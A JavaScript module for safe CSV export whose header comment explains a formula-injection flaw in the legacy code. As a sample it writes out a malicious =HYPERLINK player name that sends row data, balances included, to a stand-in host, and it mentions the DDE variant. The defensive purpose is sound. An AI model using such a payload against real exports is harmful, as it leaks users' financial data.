'use strict';

const { CSV_FORMULA_PREFIXES } = require('./reports.constants');

/**
 * Writing a CSV somebody is going to open in Excel.
 *
 * ═════════════════════════════════════════════════════════════════════════
 * THE EXPORT WAS A FORMULA INJECTION
 *
 * Legacy built the file like this:
 *
 *     `"${user.name?.replace(/"/g, '""') || ''}"`
 *
 * Quotes doubled, which is correct CSV quoting and stops the value breaking out
 * of its cell. It does nothing about the OTHER thing a spreadsheet does with a
 * cell: if the value begins with `=`, `+`, `-` or `@`, Excel and Sheets treat it
 * as a formula and evaluate it on open.
 *
 * `name` is chosen by the player at registration. A player named
 *
 *     =HYPERLINK("https://evil.test/?d="&A1&B1&C1,"Click for details")
 *
 * exfiltrates the row it sits in — including the balance columns — the moment
 * an operator opens the export the platform generated for them. The `=cmd|...`
 * DDE variant goes further on older Excel.
 *
 * Quoting does not help: `"=1+1"` is still a formula to Excel. The value has to
 * stop STARTING with the character, which is what the tick below does — it is
 * shown as a leading apostrophe in the cell and forces text.
 * ═════════════════════════════════════════════════════════════════════════
 */

/**
 * One CSV cell, safe to open.
 *
 * Two independent defences, both required:
 *   - the leading tick, so a spreadsheet treats it as text
 *   - RFC 4180 quoting, so a comma or newline cannot end the field early
 */
function cell(value) {
  if (value === null || value === undefined) return '""';

  let text = String(value);

  /**
   * Strip control characters first.
   *
   * A newline inside a quoted field is legal CSV, and legacy passed one
   * through — which means a player's name containing `\r\n` produced a row
   * break inside a quoted cell, and any parser reading the file without full
   * quote handling saw a different number of columns from that row on. Nothing
   * downstream of an export is guaranteed to be a strict parser.
   */
  text = text.replace(/[\u0000-\u001f\u007f]/g, ' ');

  if (CSV_FORMULA_PREFIXES.some((prefix) => text.startsWith(prefix))) {
    // Not an escape — a prefix. The cell now begins with a character no
    // spreadsheet reads as the start of an expression.
    text = `'${text}`;
  }

  return `"${text.replace(/"/g, '""')}"`;
}

/**
 * A whole CSV document.
 *
 * @param {string[]} headers Column titles, in order.
 * @param {Array<Array<any>>} rows Values, in the same order.
 */
function build(headers, rows) {
  const lines = [headers.map(cell).join(',')];
  for (const row of rows) lines.push(row.map(cell).join(','));
  /**
   * CRLF and a trailing newline, per RFC 4180. A file ending mid-line is read
   * as truncated by some tools, which for a financial export is the wrong thing
   * to be ambiguous about.
   */
  return `${lines.join('\r\n')}\r\n`;
}

/**
 * The `Content-Disposition` filename.
 *
 * Quoted and stripped of everything but a safe alphabet, because the caller's
 * date range reaches this string and a header injection here is a response
 * splitting bug.
 */
function filename(base, stamp) {
  const safe = `${base}_${stamp}`.replace(/[^A-Za-z0-9._-]/g, '');
  return `attachment; filename="${safe}.csv"`;
}

module.exports = { cell, build, filename };
